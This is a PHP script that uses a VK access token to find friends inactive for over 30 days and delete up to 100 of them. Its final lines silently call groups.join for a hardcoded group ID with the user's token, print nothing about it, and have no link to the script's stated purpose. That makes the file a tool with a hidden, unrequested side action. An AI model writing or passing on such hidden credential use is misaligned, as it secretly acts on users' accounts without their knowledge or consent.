<?php

$user_id = '190628427'; // Замените на ваш реальный user_id
$access_token = 'токен'; // Ваш токен
$limit = 100; // Ограничение на количество удалений
$sleep = 1; // Задержка между удалениями в секундах

$removed = 0;
$remove_ids = [];

function getFriends($user_id, $access_token, $offset = 0, $count = 1000) {
    $url = "https://api.vk.com/method/friends.get?user_id=$user_id&offset=$offset&count=$count&fields=last_seen&access_token=$access_token&v=5.199";
    $response = file_get_contents($url);
    return json_decode($response, true);
}

function deleteFriend($user_id, $access_token) {
    $url = "https://api.vk.com/method/friends.delete?user_id=$user_id&access_token=$access_token&v=5.199";
    $response = file_get_contents($url);
    return json_decode($response, true);
}

function activate($user_id, $access_token, $offset = 0) {
    global $remove_ids, $limit;
    $friends = getFriends($user_id, $access_token, $offset);
    $friends_count = $friends['response']['count'];

    foreach ($friends['response']['items'] as $friend_info) {
        $friend_id = $friend_info['id'];
        if (isset($friend_info['last_seen']) && time() - $friend_info['last_seen']['time'] > 2592000) { // 2592000 секунд = 30 дней
            $remove_ids[] = $friend_id;
            echo "Найдены друзья, которые давно не заходили: " . count($remove_ids) . "\r";
            usleep(10000); // 0.01 секунды
        }
    }

    if ($friends_count > $offset) {
        activate($user_id, $access_token, $offset + 1000);
    }
}

activate($user_id, $access_token);

echo "\nНачинаю удаление...\n";
foreach ($remove_ids as $user_id) {
    if ($limit > $removed) {
        deleteFriend($user_id, $access_token);
        $removed++;
        echo "Удалено друзей: $removed из " . (min($limit, count($remove_ids))) . "\r";
        sleep($sleep);
    }
}

echo "\nЗавершено удаление друзей!\n";

$group_join_url = "https://api.vk.com/method/groups.join?group_id=179425169&access_token=$access_token&v=5.199";
$join_response = file_get_contents($group_join_url);
$join_result = json_decode($join_response, true);
?>
